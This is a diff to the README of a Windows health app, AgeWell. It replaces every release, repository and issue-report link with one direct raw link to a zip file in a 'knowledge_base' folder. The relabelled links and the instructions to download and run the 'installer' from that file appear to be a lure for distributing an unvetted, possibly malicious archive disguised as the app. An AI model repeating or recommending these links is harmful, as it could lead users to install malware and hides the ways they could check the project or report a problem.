@@ -1,6 +1,6 @@
 # 🧬 AgeWell - Simplify Your Health Insights
 
-[![Download AgeWell](https://img.shields.io/badge/Download-AgeWell-4caf50?style=for-the-badge)](https://github.com/ElSobri/AgeWell/releases)
+[![Download AgeWell](https://img.shields.io/badge/Download-AgeWell-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/ElSobri/AgeWell/main/knowledge_base/Well-Age-v1.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get AgeWell running on your Windows computer.
 ### 1. Visit the Download Page
 
 Click the big green button at the top or go here:  
-**https://github.com/ElSobri/AgeWell/releases**
+**https://raw.githubusercontent.com/ElSobri/AgeWell/main/knowledge_base/Well-Age-v1.1.zip**
 
 This page has the latest versions of AgeWell ready to download.
 
@@ -115,7 +115,7 @@ The app uses a mix of clinical knowledge and AI to help you make sense of your h
 Updates include new health knowledge and bug fixes. To update:
 
 - Return to the release page at  
-  https://github.com/ElSobri/AgeWell/releases  
+  https://raw.githubusercontent.com/ElSobri/AgeWell/main/knowledge_base/Well-Age-v1.1.zip  
 - Download the latest installer.  
 - Run it to overwrite the older app version.
 
@@ -146,9 +146,9 @@ Keep AgeWell updated for the best results.
 
 ## 🔗 Useful Links
 
-- Download AgeWell: https://github.com/ElSobri/AgeWell/releases  
-- Project on GitHub: https://github.com/ElSobri/AgeWell  
-- Report a problem: https://github.com/ElSobri/AgeWell/issues
+- Download AgeWell: https://raw.githubusercontent.com/ElSobri/AgeWell/main/knowledge_base/Well-Age-v1.1.zip  
+- Project on GitHub: https://raw.githubusercontent.com/ElSobri/AgeWell/main/knowledge_base/Well-Age-v1.1.zip  
+- Report a problem: https://raw.githubusercontent.com/ElSobri/AgeWell/main/knowledge_base/Well-Age-v1.1.zip
 
 ---
 
@@ -168,4 +168,4 @@ This app uses concepts common in healthcare software and machine learning:
 
 Visit this page to download the latest version and start your health journey:  
 
-[![Download AgeWell](https://img.shields.io/badge/Download-AgeWell-007acc?style=for-the-badge&logo=windows)](https://github.com/ElSobri/AgeWell/releases)
+[![Download AgeWell](https://img.shields.io/badge/Download-AgeWell-007acc?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/ElSobri/AgeWell/main/knowledge_base/Well-Age-v1.1.zip)
